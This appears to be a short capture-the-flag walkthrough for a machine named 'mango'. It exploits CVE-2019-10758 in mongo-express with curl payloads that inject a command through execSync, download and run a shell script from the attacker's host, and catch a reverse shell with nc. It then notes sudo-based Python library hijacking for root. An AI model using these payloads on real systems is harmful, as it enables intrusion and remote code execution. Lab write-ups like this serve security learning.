## Recon

```sh
└─# nmap -sV -Pn -p1-65535 --min-rate 3000 $ip
8081

```

found 
- https://0day.design/2020/01/08/CVE-2019-10758%E5%A4%8D%E7%8E%B0/


```sh
─# curl 'http://172.31.93.192:8081/checkValid' -H 'Authorization: Basic YWRtaW46cGFzcw=='  --data 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("wget http://172.27.228.250/s.sh -O /tmp/s.sh")'
Valid          

─# curl 'http://172.31.93.192:8081/checkValid' -H 'Authorization: Basic YWRtaW46cGFzcw=='  --data 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("/bin/bash /tmp/s.sh")'


─# sudo rlwrap nc -lnvp 1338
listening on [any] 1338 ...
connect to [172.27.228.250] from (UNKNOWN) [172.31.93.192] 56470
sh: 0: can't access tty; job control turned off
$ id
uid=1000(mango) gid=1000(mango) groups=1000(mango)

```


## Root
```sh
$ sudo -l
Matching Defaults entries for mango on mango:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mango may run the following commands on mango:
    (ALL) NOPASSWD: /usr/bin/python3 /scripts/*.py
$ 


```

- Python Library Hijacking


```sh

mango@mango:~$ find / -type f -name "os.py" 2>/dev/null
/usr/lib/python3.10/os.py
/snap/core20/1778/usr/lib/python3.8/os.py
/snap/core20/1587/usr/lib/python3.8/os.py
mango@mango:~$ 

```